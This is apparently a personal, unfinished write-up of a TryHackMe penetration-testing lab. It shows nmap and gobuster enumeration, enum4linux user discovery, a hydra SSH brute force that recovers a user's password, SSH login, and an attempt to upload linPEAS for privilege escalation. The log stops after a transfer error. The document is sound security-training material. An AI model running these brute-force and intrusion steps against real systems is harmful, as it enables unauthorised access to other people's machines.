kali@kali:~/oscptraining/tryhackme/BasicPentest$ nmap -sV -sC -o nmap 10.10.13.128
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 10:30 EDT
Nmap scan report for 10.10.13.128
Host is up (0.35s latency).
Not shown: 990 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp    open     http           Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp   open     netbios-ssn    Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn    Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1061/tcp  filtered kiosk
1233/tcp  filtered univ-appserver
3800/tcp  filtered pwgpsi
8009/tcp  open     ajp13          Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open     http           Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
14441/tcp filtered unknown
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2020-10-12T10:31:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-12T14:31:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.13 seconds


kali@kali:~/oscptraining/tryhackme/BasicPentest$ gobuster dir -e -u http://10.10.13.128/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.13.128/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/10/12 10:32:37 Starting gobuster
===============================================================
http://10.10.13.128/.hta (Status: 403)
http://10.10.13.128/.htaccess (Status: 403)
http://10.10.13.128/.htpasswd (Status: 403)
http://10.10.13.128/development (Status: 301)
http://10.10.13.128/index.html (Status: 200)
http://10.10.13.128/server-status (Status: 403)
===============================================================
2020/10/12 10:35:13 Finished
===============================================================



some content from /development
seems like we can use SMB to get the credentials 

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

enumerate it with enum4linux
enum4linux -a 10.10.13.128 | tee basicpentest.log 

kali@kali:~/oscptraining/tryhackme/BasicPentest$ enum4linux -a 10.10.13.128
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 12 10:52:51 2020

S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

 ============================================= 
|    Getting printer info for 10.10.13.128    |
 ============================================= 
No printers returned.

enum4linux complete on Mon Oct 12 11:15:10 2020

it took close to 30min... but at least we got 2 users. lets proceed to brute force by hydra.

kali@kali:~/oscptraining/tryhackme/BasicPentest$ hydra 10.10.13.128 ssh -l jan -P /usr/share/wordlists/rockyou.txt
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-12 11:20:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.13.128:22/
[STATUS] 159.00 tries/min, 159 tries in 00:01h, 14344240 to do in 1503:36h, 16 active
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344063 to do in 2134:32h, 16 active
[STATUS] 105.14 tries/min, 736 tries in 00:07h, 14343663 to do in 2273:41h, 16 active
[22][ssh] host: 10.10.13.128   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-12 11:28:01

lets ssh into the box

kali@kali:~/oscptraining/tryhackme/BasicPentest$ ssh jan@10.10.250.74

cant really access stuff inside. let's set up linpeas on my kali machine
kali@kali:~$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git


copying the linpeas file over using scp
kali@kali:~$ scp /home/kali/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh jan@10.10.250.74:/home/kay
jan@10.10.250.74's password: 
scp: /home/linpeas.sh: Permission denied

i kept failing, not sure why though
lets host a simple python webserver then

BrokenPipeError: [Errno 32] Broken pipe
kept getting the above error.... 





